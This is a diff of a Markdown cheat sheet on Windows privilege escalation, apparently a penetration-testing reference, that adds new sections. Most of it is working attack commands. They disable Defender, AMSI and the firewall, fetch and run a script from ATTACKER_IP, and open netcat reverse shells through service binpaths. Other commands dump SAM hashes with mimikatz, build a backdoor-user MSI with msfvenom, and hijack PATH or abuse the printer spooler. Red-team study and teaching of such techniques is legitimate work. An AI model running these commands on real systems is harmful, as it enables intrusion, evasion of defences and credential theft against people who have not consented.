@@ -8,11 +8,14 @@
 * [Network Enumeration](#network-enumeration)
 * [Antivirus & Detections](#antivirus--detections)
     * [Windows Defender](#windows-defender)
+    * [Firewall](#firewall)
     * [AppLocker Enumeration](#applocker-enumeration)
     * [Powershell](#powershell)
     * [Default Writeable Folders](#default-writeable-folders)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
     * [SAM and SYSTEM files](#sam-and-system-files)
+    * [HiveNightmare](#hivenightmare)
+    * [LAPS Settings](#laps-settings)
     * [Search for file contents](#search-for-file-contents)
     * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
     * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
@@ -20,37 +23,48 @@
     * [Wifi passwords](#wifi-passwords)
     * [Sticky Notes passwords](#sticky-notes-passwords)
     * [Passwords stored in services](#passwords-stored-in-services)
-    * [Powershell history](#powershell-history)
+    * [Passwords stored in Key Manager](#passwords-stored-in-key-manager)
+    * [Powershell History](#powershell-history)
+    * [Powershell Transcript](#powershell-transcript)
+    * [Password in Alternate Data Stream](#password-in-alternate-data-stream)
 * [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
 * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
 * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
 * [EoP - Unquoted Service Paths](#eop---unquoted-service-paths)
+* [EoP - $PATH Interception](#eop---path-interception)
 * [EoP - Named Pipes](#eop---named-pipes)
 * [EoP - Kernel Exploitation](#eop---kernel-exploitation)
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Evaluating Vulnerable Drivers](#eop---evaluating-vulnerable-drivers)
+* [EoP - Printers](#eop---printers)
+    * [Universal Printer](#universal-printer)
+    * [Bring Your Own Vulnerability](#bring-your-own-vulnerability)
 * [EoP - Runas](#eop---runas)
 * [EoP - Abusing Shadow Copies](#eop---abusing-shadow-copies)
 * [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
 * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
 * [EoP - Impersonation Privileges](#eop---impersonation-privileges)
-  * [Restore A Service Account's Privileges](#restore-a-service-accounts-privileges)
-  * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
-  * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
-  * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
+    * [Restore A Service Account's Privileges](#restore-a-service-accounts-privileges)
+    * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
+    * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
+    * [Juicy Potato (Abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
+    * [Rogue Potato (Fake OXID Resolver)](#rogue-potato-fake-oxid-resolver))
+    * [EFSPotato (MS-EFSR EfsRpcOpenFileRaw)](#efspotato-ms-efsr-efsrpcopenfileraw))
 * [EoP - Privileged File Write](#eop---privileged-file-write)
     * [DiagHub](#diaghub)
     * [UsoDLLLoader](#usodllloader)
     * [WerTrigger](#wertrigger)
+    * [WerMgr](#wermgr)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
-  * [MS08-067 (NetAPI)](#ms08-067-netapi)
-  * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
-  * [MS11-080 (adf.sys)](#ms11-080-afd.sys---microsoft-windows-xp-2003)
-  * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
-  * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
-  * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
-  * [CVE-2019-1388](#cve-2019-1388)
+    * [MS08-067 (NetAPI)](#ms08-067-netapi)
+    * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
+    * [MS11-080 (adf.sys)](#ms11-080-afd.sys---microsoft-windows-xp-2003)
+    * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
+    * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
+    * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
+    * [CVE-2019-1388](#cve-2019-1388)
+* [EoP - $PATH Interception](#eop---path-interception)
 * [References](#references)
 
 ## Tools
@@ -83,6 +97,23 @@
 - [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
     ```powershell
     powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+    ```
+- [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
+- [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)
+    ```powershell
+    # First obtain systeminfo
+    systeminfo
+    systeminfo > systeminfo.txt
+    # Then feed it to wesng
+    python3 wes.py --update-wes
+    python3 wes.py --update
+    python3 wes.py systeminfo.txt
+    ```
+- [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)
+    ```powershell
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"
     ```
 
 ## Windows Version and Configuration
@@ -171,6 +202,14 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
 ```
 
+Get Domain Controllers
+
+```powershell
+nltest /DCLIST:DomainName
+nltest /DCNAME:DomainName
+nltest /DSGETDC:DomainName
+```
+
 ## Network Enumeration
 
 List all network interfaces, IP, and DNS.
@@ -201,13 +240,54 @@ List all current connections
 netstat -ano
 ```
 
+List all network shares
+
+```powershell
+net share
+powershell Find-DomainShare -ComputerDomain domain.local
+```
+
+SNMP Configuration
+
+```powershell
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+```
+
+## Antivirus & Detections
+
+Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
+
+### Windows Defender
+
+```powershell
+# check status of Defender
+PS C:\> Get-MpComputerStatus
+
+# disable scanning all downloaded files and attachments, disable AMSI (reactive)
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+PS C:\> Set-MpPreference -DisableIOAVProtection $true
+
+# disable AMSI (set to 0 to enable)
+PS C:\> Set-MpPreference -DisableScriptScanning 1 
+
+# exclude a folder
+PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
+PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
+PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
+
+# remove signatures (if Internet connection is present, they will be downloaded again):
+PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
+PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+```
+
+### Firewall
+
 List firewall state and current configuration
 
 ```powershell
 netsh advfirewall firewall dump
-
-or 
-
+# or 
 netsh firewall show state
 netsh firewall show config
 ```
@@ -221,46 +301,33 @@ $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"}
 Disable firewall
 
 ```powershell
+# Disable Firewall on Windows 7 via cmd
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+# Disable Firewall on Windows 7 via Powershell
+powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`
+
+# Disable Firewall on any windows via cmd
 netsh firewall set opmode disable
-netsh advfirewall set allprofiles state off
+netsh Advfirewall set allprofiles state off
 ```
 
-List all network shares
-
-```powershell
-net share
-```
-
-SNMP Configuration
-
-```powershell
-reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
-Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
-```
-
-## Antivirus & Detections
-
-### Windows Defender
-
-```powershell
-# check status of Defender
-PS C:\> Get-MpComputerStatus
-
-# disable Real Time Monitoring
-PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
-```
 
 ### AppLocker Enumeration
 
 - With the GPO
-- HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
+- `HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2` (Keys: Appx, Dll, Exe, Msi and Script).
 
-List AppLocker rules
+* List AppLocker rules
+    ```powershell
+    PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+    ```
 
-```powershell
-PS C:\> $a = Get-ApplockerPolicy -effective
-PS C:\> $a.rulecollections
-```
+* AppLocker Bypass
+    * By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users
+    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
+    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md
+    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md
 
 ### Powershell
 
@@ -271,7 +338,20 @@ C:\windows\syswow64\windowspowershell\v1.0\powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell
 ```
 
-Example of AMSI Bypass.
+#### Powershell Constrained Mode
+
+* Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageMode`
+* [bypass-clm - PowerShell Constrained Language Mode Bypass](https://github.com/calebstewart/bypass-clm)
+* [PowerShdll - Powershell with no Powershell.exe via DLL's](https://github.com/p3nt4/PowerShdll): `rundll32.exe C:\temp\PowerShdll.dll,main`
+* Other bypasses
+    ```powershell
+    PS > &{ whoami }
+    powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
+    ```
+
+#### AMSI Bypass
+
+Find more AMSI bypass: [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)
 
 ```powershell
 PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
@@ -283,8 +363,22 @@ PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetF
 ```powershell
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
+C:\Windows\System32\spool\printers
+C:\Windows\System32\spool\servers
+C:\Windows\tracing
+C:\Windows\Temp
+C:\Users\Public
 C:\Windows\Tasks
-C:\windows\tracing
+C:\Windows\System32\tasks
+C:\Windows\SysWOW64\tasks
+C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
+C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
+C:\Windows\debug\wia
+C:\Windows\registration\crmlog
+C:\Windows\System32\com\dmp
+C:\Windows\SysWOW64\com\dmp
+C:\Windows\System32\fxstmp
+C:\Windows\SysWOW64\fxstmp
 ```
 
 ## EoP - Looting for passwords
@@ -310,15 +404,78 @@ pwdump SYSTEM SAM > /root/sam.txt
 samdump2 SYSTEM SAM -o sam.txt
 ```
 
-Then crack it with `john -format=NT /root/sam.txt`.
+Either crack it with `john -format=NT /root/sam.txt`, [hashcat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat) or use Pass-The-Hash.
+
+
+### HiveNightmare
+
+> CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user
+
+Check for the vulnerability using `icacls`
+
+```powershell
+C:\Windows\System32> icacls config\SAM
+config\SAM BUILTIN\Administrators:(I)(F)
+           NT AUTHORITY\SYSTEM:(I)(F)
+           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!
+```
+
+Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.
+
+```powershell
+mimikatz> token::whoami /full
+
+# List shadow copies available
+mimikatz> misc::shadowcopies
+
+# Extract account from SAM databases
+mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+
+# Extract secrets from SECURITY
+mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
+```
+
+### LAPS Settings
+
+Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry.
+
+* LAPS Enabled: AdmPwdEnabled
+* LAPS Admin Account Name: AdminAccountName
+* LAPS Password Complexity: PasswordComplexity
+* LAPS Password Length: PasswordLength
+* LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled
+
 
 ### Search for file contents
 
 ```powershell
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
-findstr /si password *.xml *.ini *.txt *.config
+findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
 findstr /spin "password" *.*
 ```
+
+Also search in remote places such as SMB Shares and SharePoint:
+
+* Search passwords in SharePoint: [nheiniger/SnaffPoint](https://github.com/nheiniger/SnaffPoint) (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)
+
+```powershell
+# First, retrieve a token
+## Method 1: using SnaffPoint binary
+$token = (.\GetBearerToken.exe https://your.sharepoint.com)
+## Method 2: using AADInternals
+Install-Module AADInternals -Scope CurrentUser
+Import-Module AADInternals
+$token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com")
+
+# Second, search on Sharepoint
+## Method 1: using search strings in ./presets dir
+.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token
+## Method 2: using search string in command line
+### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference
+.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config"
+```
+
+* Search passwords in SMB Shares: [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)
 
 ### Search for a file with a certain filename
 
@@ -343,12 +500,6 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
-```
-
-### Read a value of a certain sub key
-
-```powershell
-REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
 ```
 
 ### Passwords in unattend.xml
@@ -425,6 +576,8 @@ C:\inetpub\wwwroot\web.config
 %USERPROFILE%\ntuser.dat
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 %WINDIR%\System32\drivers\etc\hosts
+C:\ProgramData\Configs\*
+C:\Program Files\Windows PowerShell\*
 dir c:*vnc.ini /s /b
 dir c:*ultravnc.ini /s /b
 ```
@@ -463,7 +616,18 @@ Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 
-### Powershell history
+
+### Passwords stored in Key Manager
+
+:warning: This software will display its output in a GUI
+
+```ps1
+rundll32 keymgr,KRShowKeyMgr
+```
+
+### Powershell History
+
+Disable Powershell history: `Set-PSReadlineOption -HistorySaveStyle SaveNothing`.
 
 ```powershell
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -473,64 +637,71 @@ cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 
+### Powershell Transcript
+
+```xml
+C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
+C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
+```
+
+### Password in Alternate Data Stream
+
+```ps1
+PS > Get-Item -path flag.txt -Stream *
+PS > Get-Content -path flag.txt -Stream Flag
+```
+
 ## EoP - Processes Enumeration and Tasks
 
-What processes are running?
+* What processes are running?
+    ```powershell
+    tasklist /v
+    net start
+    sc query
+    Get-Service
+    Get-Process
+    Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+    ```
 
-```powershell
-tasklist /v
-net start
-sc query
-Get-Service
-Get-Process
-Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
-```
+* Which processes are running as "system"
+    ```powershell
+    tasklist /v /fi "username eq system"
+    ```
 
-Which processes are running as "system"
+* Do you have powershell magic?
+    ```powershell
+    REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
+    ```
 
-```powershell
-tasklist /v /fi "username eq system"
-```
+* List installed programs
+    ```powershell
+    Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+    ```
 
-Do you have powershell magic?
+* List services
+    ```powershell
+    net start
+    wmic service list brief
+    tasklist /SVC
+    ```
 
-```powershell
-REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
-```
+* Enumerate scheduled tasks
+    ```powershell
+    schtasks /query /fo LIST 2>nul | findstr TaskName
+    schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+    ```
 
-List installed programs
-
-```powershell
-Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
-Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
-```
-
-List services
-
-```powershell
-net start
-wmic service list brief
-tasklist /SVC
-```
-
-Scheduled tasks
-
-```powershell
-schtasks /query /fo LIST 2>nul | findstr TaskName
-schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
-Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
-```
-
-Startup tasks
-
-```powershell
-wmic startup get caption,command
-reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
-reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
-dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
-dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
-```
+* Startup tasks
+    ```powershell
+    wmic startup get caption,command
+    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
+    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+    dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+    dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+    ```
 
 ## EoP - Incorrect permissions in services
 
@@ -560,17 +731,16 @@ Often, services are pointing to writeable locations:
     ```
 
 - PATH directories with weak permissions
+    ```powershell
+    $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+    $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
 
-```powershell
-$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
-$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
-
-$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
-FOR /F %i in (Servicenames.txt) DO echo %i
-type Servicenames.txt
-FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
-FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
-```
+    $ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
+    FOR /F %i in (Servicenames.txt) DO echo %i
+    type Servicenames.txt
+    FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+    ```
 
 Alternatively you can use the Metasploit exploit : `exploit/windows/local/service_permissions`
 
@@ -588,7 +758,7 @@ Prerequisite: Service account
 PS C:\Windows\system32> sc.exe stop UsoSvc
 PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
 PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
-PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
 PS C:\Windows\system32> sc.exe qc usosvc
 [SC] QueryServiceConfig SUCCESS
 
@@ -688,7 +858,6 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 
 * Metasploit exploit : `exploit/windows/local/trusted_service_path`
 * PowerUp exploit
-
     ```powershell
     # find the vulnerable application
     C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
@@ -710,6 +879,30 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
 - `C:\Program.exe`
 - `C:\Program Files.exe`
+
+
+## EoP - $PATH Interception
+
+Requirements:
+- PATH contains a writeable folder with low privileges.
+- The writeable folder is _before_ the folder that contains the legitimate binary.
+
+EXAMPLE:
+```powershell
+# List contents of the PATH environment variable
+# EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
+$env:Path
+
+# See permissions of the target folder
+# EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
+icacls.exe "C:\Program Files\nodejs\"
+
+# Place our evil-file in that folder.
+copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
+```
+
+Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. 
+
 
 ## EoP - Named Pipes
 
@@ -751,19 +944,26 @@ Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
 
 Check if these registry values are set to "1".
 
-```bat
+```powershell
 $ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 $ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+$ Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
+$ Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
 Then create an MSI package and install it.
 
 ```powershell
 $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
 $ msiexec /quiet /qn /i C:\evil.msi
 ```
 
-Technique also available in Metasploit : `exploit/windows/local/always_install_elevated`
+Technique also available in :
+* Metasploit : `exploit/windows/local/always_install_elevated`
+* PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`
+
 
 ## EoP - Insecure GUI apps
 
@@ -775,9 +975,8 @@ Example: "Windows Help and Support" (Windows + F1), search for "command prompt",
 Look for vuln drivers loaded, we often don't spend enough time looking at this:
 
 ```powershell
-# https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery
-
-PS C:\Users\Swissky> driverquery.exe /fo table
+# Native binary
+PS C:\Users\Swissky> driverquery.exe /fo table /si
 Module Name  Display Name           Driver Type   Link Date
 ============ ====================== ============= ======================
 1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM
@@ -791,6 +990,7 @@ acpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM
 ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
 <SNIP>
 
+# https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery
 PS C:\Users\Swissky> DriverQuery.exe --no-msft
 [+] Enumerating driver services...
 [+] Checking file signatures...
@@ -802,6 +1002,91 @@ Citrix USB Filter Driver
     Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US
     Signer: CN="Citrix Systems, Inc.", OU=XenApp(ClientSHA256), O="Citrix Systems, Inc.", L=Fort Lauderdale, S=Florida, C=US
 <SNIP>
+```
+
+## EoP - Printers
+
+### Universal Printer
+
+Create a Printer
+
+```ps1
+$printerName     = 'Universal Priv Printer'
+$system32        = $env:systemroot + '\system32'
+$drivers         = $system32 + '\spool\drivers'
+$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
+ 
+Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
+Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
+Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
+ 
+Add-PrinterDriver -Name       'Generic / Text Only'
+Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
+ 
+New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
+```
+
+Execute the driver
+
+```ps1
+$serverName  = 'dc.purple.lab'
+$printerName = 'Universal Priv Printer'
+$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
+Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
+Add-Printer -ConnectionName $fullprinterName
+```
+
+### PrinterNightmare
+
+```ps1
+git clone https://github.com/Flangvik/DeployPrinterNightmare
+PS C:\adversary> FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
+[<3] @Flangvik - TrustedSec
+[+] Copying C:\Windows\system32\mscms.dll to C:\Windows\system32\6cfbaf26f4c64131896df8a522546e9c.dll
